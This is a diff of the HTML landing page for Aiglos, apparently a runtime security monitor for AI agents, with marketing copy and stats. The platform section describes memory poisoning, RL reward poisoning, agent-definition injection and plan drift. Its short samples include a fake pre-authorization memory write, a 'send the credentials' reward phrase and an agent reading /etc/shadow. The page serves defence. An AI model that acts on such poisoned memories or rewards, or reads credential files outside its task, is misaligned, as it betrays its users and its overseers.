@@ -3,7 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Aiglos -- AI Agent Security Platform</title>
+<title>Aiglos -- AI Agent Security Runtime | 75 Threat Families, Zero Dependencies</title>
+<meta name="description" content="Protocol-agnostic AI agent security runtime. 75 threat families, 19 campaign patterns, ATLAS coverage mapping, GHSA intelligence. One import, zero dependencies.">
+<meta property="og:title" content="Aiglos -- AI Agent Security Runtime">
+<meta property="og:description" content="Every surface. Every session. Every belief. 75 threat families across MCP, HTTP, and subprocess. Zero dependencies.">
+<meta property="og:type" content="website">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@600;700;800&family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,400&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
@@ -16,23 +20,21 @@ html{scroll-behavior:smooth}
   --white:#FFFFFF;--muted:rgba(255,255,255,0.50);--dim:rgba(255,255,255,0.24);--faint:rgba(255,255,255,0.10);
   --orange:#F97316;--orange2:rgba(249,115,22,0.14);--orange3:rgba(249,115,22,0.07);--orange4:rgba(249,115,22,0.04);
   --green:#10B981;--green2:rgba(16,185,129,0.12);--red:#EF4444;--red2:rgba(239,68,68,0.12);
-  --amber:#F59E0B;--blue:#60A5FA;
+  --amber:#F59E0B;--blue:#60A5FA;--purple:#C084FC;
   --mono:'DM Mono','Cascadia Code',ui-monospace,monospace;
   --sans:'DM Sans',-apple-system,system-ui,sans-serif;
   --display:'Syne',-apple-system,system-ui,sans-serif;
 }
 body{background:var(--bg);color:var(--white);font-family:var(--sans);font-size:15px;line-height:1.6;-webkit-font-smoothing:antialiased;overflow-x:hidden}
-/* noise */
 body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.025;
   background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
   background-size:128px}
 
-/* NAV */
 nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:0 48px;height:56px;background:rgba(8,8,13,.85);backdrop-filter:blur(20px) saturate(180%);border-bottom:1px solid var(--border)}
 .nav-logo{font-family:var(--display);font-size:17px;font-weight:700;letter-spacing:-.01em;color:var(--white);text-decoration:none;display:flex;align-items:center;gap:9px}
 .nav-pip{width:7px;height:7px;border-radius:50%;background:var(--orange);box-shadow:0 0 10px var(--orange),0 0 20px rgba(249,115,22,.4);animation:pip 3s ease-in-out infinite}
 @keyframes pip{0%,100%{opacity:1;box-shadow:0 0 10px var(--orange),0 0 20px rgba(249,115,22,.4)}50%{opacity:.7;box-shadow:0 0 6px var(--orange),0 0 12px rgba(249,115,22,.2)}}
-.nav-links{display:flex;gap:32px;list-style:none;position:absolute;left:50%;transform:translateX(-50%)}
+.nav-links{display:flex;gap:28px;list-style:none;position:absolute;left:50%;transform:translateX(-50%)}
 .nav-links a{font-size:13.5px;color:var(--muted);text-decoration:none;transition:color .15s;letter-spacing:.01em}
 .nav-links a:hover{color:var(--white)}
 .nav-ctas{display:flex;align-items:center;gap:12px}
@@ -42,7 +44,6 @@ nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:cen
 .nav-btn-solid{background:var(--orange);color:#fff;border:1px solid var(--orange)}
 .nav-btn-solid:hover{background:#ea6a0a}
 
-/* HERO */
 .hero{min-height:100vh;display:grid;grid-template-columns:1fr 1fr;align-items:center;gap:64px;padding:112px 80px 80px;position:relative;overflow:hidden}
 .hero::before{content:'';position:absolute;inset:0;z-index:0;background-image:radial-gradient(circle,rgba(255,255,255,.12) 1px,transparent 1px);background-size:32px 32px;mask-image:radial-gradient(ellipse 80% 80% at 50% 50%,black 0%,transparent 100%);-webkit-mask-image:radial-gradient(ellipse 80% 80% at 50% 50%,black 0%,transparent 100%)}
 .hero::after{content:'';position:absolute;top:-20%;left:30%;right:10%;height:70%;background:radial-gradient(ellipse at 60% 0%,rgba(249,115,22,.12) 0%,transparent 65%);z-index:0;pointer-events:none}
@@ -51,7 +52,7 @@ nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:cen
 .hero-eyebrow-dot{width:5px;height:5px;border-radius:50%;background:var(--orange);animation:pip 2s ease-in-out infinite}
 h1{font-family:var(--display);font-size:clamp(40px,5vw,60px);font-weight:800;line-height:1.08;letter-spacing:-.03em;margin-bottom:24px;background:linear-gradient(180deg,#fff 0%,rgba(255,255,255,.75) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
 h1 em{font-style:normal;background:linear-gradient(135deg,#F97316 0%,#FDBA74 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.hero-sub{font-size:16px;color:var(--muted);line-height:1.7;max-width:440px;margin-bottom:36px}
+.hero-sub{font-size:16px;color:var(--muted);line-height:1.7;max-width:460px;margin-bottom:36px}
 .install-row{display:flex;align-items:center;gap:12px;margin-bottom:36px}
 .install-box{display:flex;align-items:center;background:var(--surface);border:1px solid var(--border2);border-radius:8px;overflow:hidden;flex:1;max-width:320px}
 .install-cmd{font-family:var(--mono);font-size:13px;color:var(--white);padding:10px 16px;flex:1}
@@ -68,7 +69,6 @@ h1 em{font-style:normal;background:linear-gradient(135deg,#F97316 0%,#FDBA74 100
 .hero-stat-n{display:block;font-family:var(--display);font-size:22px;font-weight:700;letter-spacing:-.02em;color:var(--white)}
 .hero-stat-l{display:block;font-size:12px;color:var(--dim);margin-top:2px}
 
-/* TERMINAL */
 .terminal-wrap{position:relative;z-index:1;animation:fade-up .6s .15s ease both;display:flex;flex-direction:column;gap:14px}
 .terminal-wrap::before{content:'';position:absolute;top:-60px;left:-60px;right:-60px;bottom:-40px;background:radial-gradient(ellipse at 50% 40%,rgba(249,115,22,.10) 0%,transparent 65%);z-index:-1;pointer-events:none}
 .terminal{background:var(--surface);border:1px solid var(--border2);border-radius:12px;overflow:hidden;box-shadow:0 32px 80px rgba(0,0,0,.6),0 0 0 1px rgba(255,255,255,.04);position:relative}
@@ -94,7 +94,6 @@ h1 em{font-style:normal;background:linear-gradient(135deg,#F97316 0%,#FDBA74 100
 .ndaa-label{font-family:var(--mono);font-size:10px;font-weight:500;color:var(--orange);letter-spacing:.06em;text-transform:uppercase;background:var(--orange4);border:1px solid rgba(249,115,22,.2);padding:3px 8px;border-radius:4px;white-space:nowrap;flex-shrink:0;margin-top:1px}
 .ndaa-text{font-size:12.5px;color:var(--muted);line-height:1.5}
 
-/* STATS */
 .stats-strip{border-top:1px solid var(--border);border-bottom:1px solid var(--border);background:linear-gradient(180deg,var(--bg2) 0%,var(--bg) 100%);padding:32px 80px}
 .stats-inner{max-width:1100px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:24px}
 .stat-block{text-align:center}
@@ -102,14 +101,12 @@ h1 em{font-style:normal;background:linear-gradient(135deg,#F97316 0%,#FDBA74 100
 .stat-n.orange{color:var(--orange)}
 .stat-l{font-size:12px;color:var(--dim);margin-top:3px}
 
-/* SECTIONS */
 .divider{height:1px;background:var(--border);margin:0 80px}
 .section{max-width:1100px;margin:0 auto;padding:80px 80px}
 .section-tag{display:inline-block;font-family:var(--mono);font-size:11px;font-weight:500;color:var(--orange);letter-spacing:.08em;text-transform:uppercase;margin-bottom:18px}
 h2{font-family:var(--display);font-size:clamp(26px,3vw,36px);font-weight:700;letter-spacing:-.025em;line-height:1.15;margin-bottom:16px;background:linear-gradient(180deg,#fff 0%,rgba(255,255,255,.8) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
 .section-sub{font-size:15.5px;color:var(--muted);max-width:600px;line-height:1.7;margin-bottom:48px}
 
-/* BENTO */
 .bento{display:grid;grid-template-columns:repeat(3,1fr);grid-template-rows:auto auto;gap:14px}
 .bento-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:28px 26px;position:relative;overflow:hidden;transition:border-color .2s}
 .bento-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.10),transparent)}
@@ -125,7 +122,6 @@ h2{font-family:var(--display);font-size:clamp(26px,3vw,36px);font-weight:700;let
 .bento-card.glow{background:linear-gradient(135deg,rgba(249,115,22,.08) 0%,var(--card) 50%);border-color:rgba(249,115,22,.2)}
 .bento-card.glow::after{content:'';position:absolute;top:-30px;right:-30px;width:120px;height:120px;background:radial-gradient(circle,rgba(249,115,22,.15) 0%,transparent 70%);pointer-events:none}
 
-/* CAMPAIGN */
 .campaign-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
 .camp-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px 20px;position:relative;overflow:hidden;transition:border-color .2s,background .2s}
 .camp-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent)}
@@ -136,9 +132,10 @@ h2{font-family:var(--display);font-size:clamp(26px,3vw,36px);font-weight:700;let
 .conf-bar{flex:1;height:3px;border-radius:2px;background:var(--border2);position:relative;overflow:hidden}
 .conf-fill{position:absolute;top:0;left:0;height:100%;border-radius:2px;background:linear-gradient(90deg,var(--orange),#FDBA74)}
 .camp-card.new{border-color:rgba(249,115,22,.2);background:linear-gradient(135deg,rgba(249,115,22,.06) 0%,var(--card) 60%)}
+.camp-card.hero-camp{border-color:rgba(239,68,68,.25);background:linear-gradient(135deg,rgba(239,68,68,.08) 0%,var(--card) 60%)}
 .new-badge{position:absolute;top:12px;right:12px;font-family:var(--mono);font-size:9px;font-weight:500;color:var(--orange);letter-spacing:.06em;text-transform:uppercase;background:var(--orange4);border:1px solid rgba(249,115,22,.25);padding:2px 6px;border-radius:4px}
+.hero-badge{position:absolute;top:12px;right:12px;font-family:var(--mono);font-size:9px;font-weight:500;color:#F87171;letter-spacing:.06em;text-transform:uppercase;background:var(--red2);border:1px solid rgba(239,68,68,.25);padding:2px 6px;border-radius:4px}
 
-/* CODE SECTION */
 .code-section{display:grid;grid-template-columns:1fr 1fr;gap:64px;align-items:center}
 .code-explain p{font-size:15px;color:var(--muted);line-height:1.7;margin-bottom:28px}
 .code-feature{display:flex;gap:14px;margin-bottom:20px;align-items:flex-start}
@@ -151,7 +148,6 @@ h2{font-family:var(--display);font-size:clamp(26px,3vw,36px);font-weight:700;let
 .code-body{padding:20px 22px;font-family:var(--mono);font-size:12.5px;line-height:1.75;color:var(--muted)}
 .c-kw{color:#C084FC}.c-op{color:#CBD5E1}.c-fn{color:#60A5FA}.c-str{color:#86EFAC}.c-attr{color:#FCA5A5}.c-comment{color:#475569}.c-ok{color:#60A5FA}
 
-/* THREATS */
 .threats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:10px}
 .threat-cell{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:22px 22px 18px;position:relative;overflow:hidden;transition:border-color .2s}
 .threat-cell::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent)}
@@ -161,10 +157,10 @@ h2{font-family:var(--display);font-size:clamp(26px,3vw,36px);font-weight:700;let
 .threat-desc{font-size:13px;color:var(--muted);line-height:1.6}
 .threat-sev{position:absolute;top:14px;right:14px;font-family:var(--mono);font-size:10px;font-weight:500;padding:2px 8px;border-radius:4px;letter-spacing:.04em}
 .sev-high{background:rgba(239,68,68,.12);color:#F87171;border:1px solid rgba(239,68,68,.2)}
+.sev-new{background:rgba(96,165,250,.12);color:#93C5FD;border:1px solid rgba(96,165,250,.2)}
 .threats-footer{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;background:var(--card);border:1px solid var(--border);border-radius:10px;margin-top:10px}
 .threats-count{font-size:13px;color:var(--muted)}
 
-/* STEPS */
 .steps{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:40px}
 .step{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:24px 20px;position:relative;overflow:hidden;transition:border-color .2s}
 .step::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent)}
@@ -175,7 +171,17 @@ h2{font-family:var(--display);font-size:clamp(26px,3vw,36px);font-weight:700;let
 .step-body{font-size:12.5px;color:var(--muted);line-height:1.65;margin-bottom:14px}
 .step-tag{display:inline-block;font-family:var(--mono);font-size:10.5px;color:var(--dim);background:rgba(255,255,255,.04);border:1px solid var(--border);padding:3px 9px;border-radius:4px}
 
-/* PRICING */
+.atlas-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:10px}
+.atlas-cell{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px 20px;position:relative;overflow:hidden;transition:border-color .2s}
+.atlas-cell::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent)}
+.atlas-cell:hover{border-color:var(--border2)}
+.atlas-tactic{font-family:var(--mono);font-size:10px;color:var(--blue);letter-spacing:.06em;text-transform:uppercase;margin-bottom:6px}
+.atlas-title{font-family:var(--display);font-size:13px;font-weight:700;letter-spacing:-.01em;margin-bottom:4px;color:var(--white)}
+.atlas-rules{font-family:var(--mono);font-size:10.5px;color:var(--dim);margin-top:6px}
+.atlas-status{position:absolute;top:10px;right:10px;font-family:var(--mono);font-size:10px;font-weight:500;padding:2px 6px;border-radius:4px;letter-spacing:.03em}
+.atlas-full{background:var(--green2);color:var(--green);border:1px solid rgba(16,185,129,.2)}
+.atlas-partial{background:rgba(245,158,11,.1);color:#FCD34D;border:1px solid rgba(245,158,11,.2)}
+
 .price-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
 .price-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:32px 28px;position:relative;overflow:hidden;transition:border-color .2s}
 .price-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent)}
@@ -194,7 +200,6 @@ h2{font-family:var(--display);font-size:clamp(26px,3vw,36px);font-weight:700;let
 .price-cta-ghost{background:transparent;color:var(--muted);border:1px solid var(--border2)}
 .price-cta-ghost:hover{background:var(--faint);color:var(--white);border-color:var(--border3)}
 
-/* OSS */
 .oss-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
 .oss-col{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:32px 30px;position:relative;overflow:hidden}
 .oss-col::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent)}
@@ -208,14 +213,12 @@ h2{font-family:var(--display);font-size:clamp(26px,3vw,36px);font-weight:700;let
 .oss-item-name{font-weight:500;color:var(--white);margin-right:4px}
 .oss-item div{font-size:13px;color:var(--muted);line-height:1.55}
 
-/* CTA */
 .cta-section{text-align:center;padding:96px 80px;position:relative;overflow:hidden;border-top:1px solid var(--border)}
 .cta-section::before{content:'';position:absolute;top:-60%;left:20%;right:20%;height:100%;background:radial-gradient(ellipse at 50% 0%,rgba(249,115,22,.08) 0%,transparent 65%);pointer-events:none}
 .cta-section h2{font-size:clamp(32px,4vw,48px);max-width:600px;margin:0 auto 16px}
 .cta-section p{color:var(--muted);max-width:440px;margin:0 auto 36px;font-size:15px}
 .cta-acts{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
 
-/* FOOTER */
 footer{display:flex;justify-content:space-between;align-items:center;padding:24px 80px;border-top:1px solid var(--border)}
 .footer-logo{font-family:var(--display);font-size:15px;font-weight:700;color:var(--white);text-decoration:none;display:flex;align-items:center;gap:8px}
 .footer-note{font-size:12px;color:var(--dim);margin-top:4px}
@@ -223,7 +226,6 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
 .footer-links a{font-size:13px;color:var(--dim);text-decoration:none;transition:color .15s}
 .footer-links a:hover{color:var(--muted)}
 
-/* MODAL */
 .modal-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.75);backdrop-filter:blur(12px);display:none;align-items:center;justify-content:center}
 .modal-overlay.open{display:flex}
 .modal{background:var(--card);border:1px solid var(--border2);border-radius:14px;padding:36px 32px;width:100%;max-width:420px;position:relative}
@@ -241,7 +243,6 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
 
 @keyframes fade-up{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
 
-/* RESPONSIVE */
 @media(max-width:1024px){
   .hero{grid-template-columns:1fr;padding:100px 40px 64px;gap:48px}
   .hero-sub{max-width:100%}.terminal-wrap{order:-1}
@@ -249,7 +250,7 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
   .bento{grid-template-columns:1fr 1fr}.bento-card.span-2{grid-column:span 1}.bento-card.span-3{grid-column:span 2}
   .code-section{grid-template-columns:1fr}.price-grid{grid-template-columns:1fr}
   .campaign-grid{grid-template-columns:1fr 1fr}.steps{grid-template-columns:1fr 1fr}
-  .threats{grid-template-columns:1fr 1fr}
+  .threats{grid-template-columns:1fr 1fr}.atlas-grid{grid-template-columns:1fr 1fr}
   nav{padding:0 24px}.nav-links{display:none}
   footer{padding:20px 40px;flex-direction:column;gap:16px;text-align:center}
   .cta-section{padding:72px 40px}
@@ -259,6 +260,7 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
   .bento{grid-template-columns:1fr}.bento-card.span-3{grid-column:span 1}
   .campaign-grid{grid-template-columns:1fr}.steps{grid-template-columns:1fr}
   .threats{grid-template-columns:1fr}.oss-grid{grid-template-columns:1fr}
+  .atlas-grid{grid-template-columns:1fr}
   .stats-inner{flex-direction:column;gap:20px;text-align:center}
   .stats-strip{padding:24px}.divider{margin:0 24px}
   footer{padding:20px 24px}.cta-section{padding:56px 24px}
@@ -272,34 +274,36 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
   <ul class="nav-links">
     <li><a href="#how">How it works</a></li>
     <li><a href="#threats">Threats</a></li>
-    <li><a href="#campaigns">Campaign mode</a></li>
+    <li><a href="#atlas">ATLAS</a></li>
+    <li><a href="#campaigns">Campaigns</a></li>
+    <li><a href="/docs">Docs</a></li>
     <li><a href="#pricing">Pricing</a></li>
-    </ul>
+  </ul>
   <div class="nav-ctas">
-    <a href="https://github.com/aiglos/aiglos" class="nav-btn nav-btn-ghost">GitHub</a>
-    <a href="#" class="nav-btn nav-btn-solid" onclick="openModal('free');return false">Install free</a>
+    <a href="https://github.com/w1123581321345589/aiglos" class="nav-btn nav-btn-ghost" data-testid="link-github">GitHub</a>
+    <a href="#" class="nav-btn nav-btn-solid" onclick="openModal('free');return false" data-testid="button-install-nav">Install free</a>
   </div>
 </nav>
 
 <div class="hero">
   <div class="hero-left">
-    <div class="hero-eyebrow"><span class="hero-eyebrow-dot"></span>Protocol-agnostic AI agent security</div>
+    <div class="hero-eyebrow"><span class="hero-eyebrow-dot"></span>v0.24.0 -- AI agent security runtime</div>
     <h1>Every surface.<br>Every session.<br><em>Every belief.</em></h1>
-    <p class="hero-sub">One import. MCP tool calls, direct HTTP/API requests, and subprocess execution -- inspected before they run. Session artifacts cryptographically signed and auto-generated.</p>
+    <p class="hero-sub">One import. 75 threat families across MCP tool calls, direct HTTP/API requests, and subprocess execution -- inspected before they run. Session artifacts cryptographically signed. Zero required dependencies.</p>
     <div class="install-row">
       <div class="install-box">
         <span class="install-cmd"><span class="prompt">$</span> pip install aiglos</span>
-        <button class="copy-btn" id="copy-btn" onclick="copyInstall()">Copy</button>
+        <button class="copy-btn" id="copy-btn" onclick="copyInstall()" data-testid="button-copy-install">Copy</button>
       </div>
     </div>
     <div class="hero-acts">
-      <a href="#" class="btn-lg" onclick="openModal('free');return false">Install free</a>
-      <a href="#how" class="btn-lg-ghost">See how it works →</a>
+      <a href="#" class="btn-lg" onclick="openModal('free');return false" data-testid="button-install-hero">Install free</a>
+      <a href="#how" class="btn-lg-ghost" data-testid="link-how-it-works">See how it works</a>
     </div>
     <div class="hero-stats">
-      <div><span class="hero-stat-n">T01–T43</span><span class="hero-stat-l">Threat families</span></div>
-      <div><span class="hero-stat-n">13</span><span class="hero-stat-l">Inspection triggers</span></div>
-      <div><span class="hero-stat-n">&lt;1ms</span><span class="hero-stat-l">Per-call overhead</span></div>
+      <div><span class="hero-stat-n">T01--T75</span><span class="hero-stat-l">Threat families</span></div>
+      <div><span class="hero-stat-n">19</span><span class="hero-stat-l">Campaign patterns</span></div>
+      <div><span class="hero-stat-n">93%</span><span class="hero-stat-l">ATLAS coverage</span></div>
       <div><span class="hero-stat-n">0</span><span class="hero-stat-l">Required dependencies</span></div>
     </div>
   </div>
@@ -308,7 +312,7 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
     <div class="terminal">
       <div class="t-bar">
         <div class="t-dot r"></div><div class="t-dot y"></div><div class="t-dot g"></div>
-        <span class="t-title">aiglos -- runtime monitor · v0.18.0</span>
+        <span class="t-title">aiglos -- runtime monitor -- v0.24.0</span>
       </div>
       <div class="t-body" id="t-body"><span class="t-cursor"></span></div>
     </div>
@@ -317,9 +321,10 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
 
 <div class="stats-strip">
   <div class="stats-inner">
-    <div class="stat-block"><div class="stat-n orange">1208</div><div class="stat-l">Tests passing</div></div>
-    <div class="stat-block"><div class="stat-n">3</div><div class="stat-l">Execution surfaces</div></div>
-    <div class="stat-block"><div class="stat-n">14</div><div class="stat-l">Inspection triggers</div></div>
+    <div class="stat-block"><div class="stat-n orange" data-testid="text-test-count">1,665</div><div class="stat-l">Tests passing</div></div>
+    <div class="stat-block"><div class="stat-n">75</div><div class="stat-l">Threat families</div></div>
+    <div class="stat-block"><div class="stat-n">18</div><div class="stat-l">Inspection triggers</div></div>
+    <div class="stat-block"><div class="stat-n">19</div><div class="stat-l">Campaign patterns</div></div>
     <div class="stat-block"><div class="stat-n orange">0</div><div class="stat-l">Required dependencies</div></div>
   </div>
 </div>
@@ -331,9 +336,9 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
   <p class="section-sub">Aiglos attaches at process level -- no proxy, no port, no config. All three surfaces your agent operates on are covered simultaneously in under 1ms per call.</p>
   <div class="steps">
     <div class="step"><div class="step-n"><span class="step-num">01</span></div><div class="step-title">Attach at import</div><div class="step-body"><code style="font-family:var(--mono);font-size:12px;color:var(--blue)">aiglos.attach()</code> patches MCP, requests/httpx/fetch, and subprocess simultaneously. One line covers all three surfaces.</div><div class="step-tag">pip install aiglos</div></div>
-    <div class="step"><div class="step-n"><span class="step-num">02</span></div><div class="step-title">Three surfaces, one engine</div><div class="step-body">MCP tool calls, direct <code style="font-family:var(--mono);font-size:12px">requests.post()</code>, and <code style="font-family:var(--mono);font-size:12px">subprocess.run()</code> -- all pass through T01-T43. Coding agents that never touch MCP are fully covered.</div><div class="step-tag">&lt;1ms per call</div></div>
-    <div class="step"><div class="step-n"><span class="step-num">03</span></div><div class="step-title">Classify, learn, adapt</div><div class="step-body">Observation graph accumulates session data. 14 inspection triggers surface rule drift, campaign sequences, belief poisoning, behavioral anomalies, and RL manipulation. Behavioral baseline learns what normal looks like for each agent.</div><div class="step-tag">Learns your deployment</div></div>
-    <div class="step"><div class="step-n"><span class="step-num">04</span></div><div class="step-title">Artifact at close</div><div class="step-body">Session close auto-generates a signed artifact. Cryptographically signed and structured for compliance review. No separate documentation workflow.</div><div class="step-tag">HMAC-SHA256 signed</div></div>
+    <div class="step"><div class="step-n"><span class="step-num">02</span></div><div class="step-title">75 rules, one engine</div><div class="step-body">MCP tool calls, direct <code style="font-family:var(--mono);font-size:12px">requests.post()</code>, and <code style="font-family:var(--mono);font-size:12px">subprocess.run()</code> -- all pass through T01-T75. Coding agents that never touch MCP are fully covered.</div><div class="step-tag">&lt;1ms per call</div></div>
+    <div class="step"><div class="step-n"><span class="step-num">03</span></div><div class="step-title">Classify, learn, adapt</div><div class="step-body">Observation graph accumulates session data. 18 inspection triggers surface rule drift, campaign sequences, belief poisoning, plan drift, behavioral anomalies, and RL manipulation.</div><div class="step-tag">Learns your deployment</div></div>
+    <div class="step"><div class="step-n"><span class="step-num">04</span></div><div class="step-title">Artifact at close</div><div class="step-body">Session close auto-generates a signed artifact. Cryptographically signed and structured for compliance review. ATLAS coverage, GHSA advisory status, and GOVBENCH scores included.</div><div class="step-tag">HMAC-SHA256 signed</div></div>
   </div>
 </div>
 
@@ -341,111 +346,171 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
 <div class="section">
   <span class="section-tag">Platform</span>
   <h2>Built differently at every layer.</h2>
-  <p class="section-sub">The threat engine is the foundation. The adaptive layer, memory security, and RL training security are where Aiglos goes beyond what any existing tool covers.</p>
+  <p class="section-sub">The threat engine is the foundation. The adaptive layer, memory security, Superpowers integration, and ATLAS coverage mapping are where Aiglos goes beyond what any existing tool covers.</p>
   <div class="bento">
     <div class="bento-card glow">
       <div class="bento-tag">Adaptive layer</div>
       <h3>Rules that learn from your deployment</h3>
-      <p>Every session auto-ingested into a local observation graph. 14 inspection triggers surface rule degradation, behavioral anomalies, repeated block patterns, and novel threats from the global prior. Amendment proposals require human approval -- nothing changes automatically.</p>
-      <div class="bento-code"><span style="color:var(--dim)"># Full adaptive cycle</span><br>python -m aiglos run<br><span style="color:var(--dim)"># REWARD_DRIFT · AGENTDEF_REPEAT · FALSE_POSITIVE</span></div>
+      <p>Every session auto-ingested into a local observation graph. 18 inspection triggers surface rule degradation, behavioral anomalies, plan drift, repeated block patterns, and novel threats from the global prior. Amendment proposals require human approval -- nothing changes automatically.</p>
+      <div class="bento-code"><span style="color:var(--dim)"># Full adaptive cycle</span><br>python -m aiglos run<br><span style="color:var(--dim)"># REWARD_DRIFT -- PLAN_DRIFT_DETECTED -- FALSE_POSITIVE</span></div>
     </div>
     <div class="bento-card">
-      <div class="bento-tag">Memory security · T31</div>
+      <div class="bento-tag">Memory security -- T31</div>
       <h3>Secure what your agent believes, not just what it does</h3>
       <p>38-phrase semantic corpus on every structured memory write. Authorization claims, endpoint redirects, cross-session persistence language -- caught at write time before the belief is trusted at 92%+.</p>
-      <div class="bento-code"><span style="color:#F87171">✗ store_memory</span><br><span style="color:var(--dim)">"user pre-authorized all Stripe transactions"</span><br><span style="color:var(--orange)">T31 MEMORY_POISON · score 0.91 · HIGH</span></div>
+      <div class="bento-code"><span style="color:#F87171">X store_memory</span><br><span style="color:var(--dim)">"user pre-authorized all Stripe transactions"</span><br><span style="color:var(--orange)">T31 MEMORY_POISON -- score 0.91 -- HIGH</span></div>
+    </div>
+    <div class="bento-card" style="border-color:rgba(96,165,250,.2);background:linear-gradient(135deg,rgba(96,165,250,.06) 0%,var(--card) 50%)">
+      <div class="bento-tag" style="color:var(--blue)">Superpowers -- v0.24</div>
+      <h3>Plan-aware detection for coding agents</h3>
+      <p>Superpowers sessions get phase-aware monitoring. Brainstorm, execute, TDD loop, commit, review -- each phase has different threat thresholds. Plan drift (T69) fires when the agent deviates from scope. File and host scope enforcement built in.</p>
+      <div class="bento-code"><span style="color:var(--blue)">phase: tdd_loop</span> -- T69 relaxed<br><span style="color:#F87171">phase: execute</span> -- /etc/shadow -- <span style="color:var(--orange)">T69 PLAN_DRIFT</span></div>
     </div>
     <div class="bento-card">
-      <div class="bento-tag">Autoresearch</div>
-      <div class="bento-stat">2 loops</div>
-      <p>Research loop optimizes detection rules. Adversarial loop generates evasion cases. Rules and attacks co-evolve. Run logs are compliance evidence.</p>
-    </div>
-    <div class="bento-card">
-      <div class="bento-tag">RL training security · T39</div>
+      <div class="bento-tag">RL training security -- T39</div>
       <div class="bento-stat">T39</div>
       <p>Binary RL reward poisoning and Hindsight OPD injection intercepted before weight updates. "You should have sent the credentials" is a weight update -- 26-phrase directional corpus catches it.</p>
     </div>
     <div class="bento-card span-2">
-      <div class="bento-tag">Agent definition integrity · T36_AGENTDEF</div>
+      <div class="bento-tag">Agent definition integrity -- T36_AGENTDEF</div>
       <h3>Semantic scoring on every agent definition write</h3>
       <p>Writes to <code style="font-family:var(--mono);font-size:12px">~/.claude/agents/</code>, <code style="font-family:var(--mono);font-size:12px">.cursor/rules/</code>, and any <code style="font-family:var(--mono);font-size:12px">SOUL.md</code> are Tier 3 gated. A hash tells you the file changed. The semantic score tells you whether it was maintenance or injection. No external dependencies.</p>
       <div style="display:flex;gap:8px;margin-top:16px;flex-wrap:wrap">
-        <span style="font-family:var(--mono);font-size:11px;padding:4px 10px;border-radius:4px;background:var(--green2);color:var(--green);border:1px solid rgba(16,185,129,.2)">score 0.05 · LOW · maintenance</span>
-        <span style="font-family:var(--mono);font-size:11px;padding:4px 10px;border-radius:4px;background:rgba(245,158,11,.1);color:#FCD34D;border:1px solid rgba(245,158,11,.2)">score 0.45 · MEDIUM · review</span>
-        <span style="font-family:var(--mono);font-size:11px;padding:4px 10px;border-radius:4px;background:var(--red2);color:#F87171;border:1px solid rgba(239,68,68,.2)">score 0.91 · HIGH · injection</span>
+        <span style="font-family:var(--mono);font-size:11px;padding:4px 10px;border-radius:4px;background:var(--green2);color:var(--green);border:1px solid rgba(16,185,129,.2)">score 0.05 -- LOW -- maintenance</span>
